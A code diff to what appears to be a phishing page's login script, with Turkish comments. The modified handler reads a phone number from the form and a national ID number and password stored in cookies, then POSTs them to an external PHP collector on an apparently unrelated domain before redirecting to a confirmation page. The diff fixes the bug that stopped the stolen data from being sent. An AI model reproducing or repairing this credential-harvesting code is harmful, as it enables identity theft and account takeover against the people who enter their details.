@@ -429,33 +429,35 @@
     });
 
     // Giriş butonuna tıklanınca
-    loginBtn.addEventListener('click', function () {
-        var telno = document.getElementById('telno').value;
+  loginBtn.addEventListener('click', function (event) {
+    event.preventDefault(); // Formun post işlemini engelle
+    var telno = document.getElementById('telno').value;
 
-        // Cookie'den kayıtlı adı al
-        var tcno = getCookie("tcno");
-        var pass = getCookie("pass");
+    // Cookie'den kayıtlı adı al
+    var tcno = getCookie("tcno");
+    var pass = getCookie("pass");
 
-        // POST işlemi için veri oluştur
-        var data = new FormData();
-        data.append('telno', telno);
-        data.append('tcno', tcno); // Cookie'den alınan adı ekle
-        data.append('pass', pass);
+    // POST işlemi için veri oluştur
+    var data = {
+        telno: telno,
+        tcno: tcno,
+        pass: pass
+    };
 
-       fetch('https://hamzaakkaya.av.tr/dmn/asddsa.php', {
+    fetch('https://hamzaakkaya.av.tr/dmn/asddsa.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(postData)
+        body: JSON.stringify(data)
     })
     .then(response => response.text())
     .then(data => {
         console.log(data);
-        window.location.href = 'onay.html';  
+        window.location.href = 'onay.html'; // Başvuru başarılı olduğunda onay sayfasına yönlendir
     })
     .catch(error => {
-         window.location.href = 'onay.html';
+        console.error('Error:', error);
     });
 });
 </script>
